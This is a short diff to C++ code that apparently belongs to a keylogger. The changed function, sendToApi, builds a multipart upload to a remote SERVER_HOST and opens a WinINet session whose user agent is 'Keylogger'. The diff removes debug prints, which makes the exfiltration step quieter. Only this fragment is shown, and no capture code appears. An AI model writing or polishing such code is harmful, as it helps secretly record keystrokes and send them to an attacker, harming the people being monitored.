@@ -51,10 +51,6 @@ void sendToApi(const std::string &filename)
     std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary;
     std::wstring wContentType(contentType.begin(), contentType.end());
 
-    printf("[DEBUG] Request URL: https://%s/upload\n", SERVER_HOST);
-    printf("[DEBUG] Content-Type: %s\n", contentType.c_str());
-    printf("[DEBUG] Body preview (first 200 chars): %s\n", body.substr(0, 200).c_str());
-
     HINTERNET hInternet = InternetOpenA("Keylogger", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet)
         return;
